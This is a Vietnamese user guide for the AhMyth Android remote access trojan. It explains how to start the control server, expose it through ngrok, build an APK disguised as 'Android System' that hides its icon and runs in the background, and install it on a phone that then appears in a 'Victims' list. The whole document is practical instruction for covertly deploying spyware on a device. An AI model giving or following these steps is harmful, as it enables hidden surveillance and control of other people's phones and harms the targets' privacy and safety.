# AhMyth - Hướng Dẫn Sử Dụng (Phiên Bản Thực Tế)

**Dành cho người dùng không chuyên - Đơn giản & Rõ ràng!**

---

## 🚀 **Bắt Đầu Lần Đầu Tiên**

### **Bước 1: Bấp để mở Server**
Bấp đúp file này (tùy chọn):
- **`START_SERVER.bat`** ← Hiện terminal (dễ thấy lỗi nếu có)
- **`START_SERVER.vbs`** ← Mở im lặng (nếu chỉ muốn dùng app)

**Kết quả:** Electron window "AhMyth Server" sẽ mở lên trong vòng 5-10 giây

---

### **Bước 2: Cài APK lên Điện Thoại**
File: **`AndroidSystem.apk`** (trong thư mục này)

**Cách cài:**
- Copy file vào điện thoại (USB hoặc cloud)
- Bấm vào APK → "Install"
- Cho phép cài từ nguồn không xác định (nếu được hỏi)

**Sau khi cài:**
- Ứng dụng **không hiện icon**
- Service chạy ẩn trong nền
- Bạn sẽ thấy 1 notification "Android System"

---

### **Bước 3: Kiểm Tra Kết Nối**
Trên máy tính, giao diện AhMyth Server:
1. Click tab **"Victims"**
2. Chờ 5-10 giây
3. Nếu thấy điện thoại trong danh sách → **Thành công!** ✅

---

## 🔄 **Khi Bạn Khởi Động Lại Server**

### **Vấn Đề:**
Mỗi lần restart server / ngrok, URL công khai thay đổi (nếu dùng ngrok free)

### **Giải Pháp (siêu đơn giản):**

**Bước 1: Lấy URL ngrok mới**

Sau khi bấp `START_SERVER.bat`:
1. Mở trình duyệt → nhập: **`http://127.0.0.1:4040`**
2. Bạn sẽ thấy trang ngrok giống như này:

```
╔═══════════════════════════════════════════════════════════╗
║  Forwarding URL (HTTPS): https://xxxxxx-xxxxx.ngrok.io   ║  ← Copy cái này!
║  Forwarding URL (HTTP):  http://xxxxxx-xxxxx.ngrok.io    ║
║                                                           ║
║  Status: online                                           ║
║  Version: 3.x.x                                           ║
╚═══════════════════════════════════════════════════════════╝
```

**Copy cái URL HTTPS** (dòng đầu tiên)

---

**Bước 2: Build APK mới**

1. Ở giao diện AhMyth Server → Click tab **"APK Builder"**
2. Nhập thông tin:
   ```
   [Server Host] ← Dán URL ngrok từ bước 1 (VD: xxxxxx-xxxxx.ngrok.io)
   [Server Port] ← Nhập: 443
   [✓] Use HTTPS  ← Bấm để check
   ```
3. Bấm **"Build"** → chờ 2-3 phút
4. APK mới sẽ được tạo tại folder `outputs/`

---

**Bước 3: Cài APK mới**

1. Copy APK mới vào điện thoại
2. Cài đè lên APK cũ
3. **Xong!** App tự động dùng server mới

**Không cần:**
- ❌ Mở Settings manual
- ❌ Sửa cấu hình
- App tự động nhận URL mới từ APK

---

## 🎯 **Nhanh Gọn - Bảng Tóm Tắt**

| Tình Huống | Làm Gì |
|-----------|--------|
| **Bắt đầu lần 1** | 1. Bấp `START_SERVER.bat` 2. Cài `AndroidSystem.apk` 3. Kiểm tra "Victims" |
| **Restart server** | 1. Bấp `START_SERVER.bat` 2. Lấy URL ngrok mới 3. Build APK → Cài lại |
| **Cập nhật cấu hình** | Không cần! APK mới tự động cập nhật |
| **Điện thoại mất kết nối** | Restart app hoặc khởi động lại máy tính (server cũng restart) |

---

## 🆘 **Nếu Gặp Vấn Đề**

### **P1: "Không thấy điện thoại trong Victims list"**
- Kiểm tra: Notification "Android System" có trên điện thoại không?
- Nếu không → APK chưa cài hoặc cài không thành công
- Nếu có → Chờ thêm 10-15 giây, ngrok có thể chậm

### **P2: "Phát hiện icon ứng dụng on screen"**
- Đó là hành động cố định - app đã loại bỏ icon sau cài
- Notification vẫn chạy ẩn ở background

### **P3: "Lỗi khi build APK"**
- Kiểm tra Server Host có đúng format không (VD: `xxxxx.ngrok.io`)
- Không được để dấu cách thừa

### **P4: "APK cài không được"**
- Cho phép cài app từ nguồn không xác định:
  - Android 12+: Settings → Apps → Special app access → Install unknown apps → chọn file manager
  - Android 10-11: Settings → Security → Unknown sources

---

## 📋 **File Quan Trọng**

```
d:\Dev\Projects\Android\Android-RAT-master\SystemUpdate\
├── START_SERVER.bat          ← Bấp để chạy server
├── AndroidSystem.apk         ← Cài lên điện thoại
└── SETUP_GUIDE_VN.md        ← Hướng dẫn này
```

---

## ✅ **Checklist Trước Khi Dùng**

- [ ] Máy tính kết nối internet (để chạy ngrok)
- [ ] Node.js đã cài (test: mở PowerShell → gõ `node --version`)
- [ ] Ngrok đã cấu hình auth token
- [ ] Điện thoại cùng mạng wifi hoặc internet (ngrok sẽ tunnel)

---

## 🎓 **Mẹo Nâng Cao** (tùy chọn)

**Nếu muốn URL cố định (không đổi khi restart):**
- Upgrade ngrok pro ($5-10/tháng) → được URL tĩnh
- Hoặc dùng duckdns.org (miễn phí) → tạo dynamic DNS

**Hiện tại (free ngrok):**
- URL thay đổi mỗi lần restart
- Nhưng chỉ cần build APK mới là được

---

**Thắc mắc gì cứ hỏi!** 💬
Hành trình của bạn bắt đầu đây! 🚀
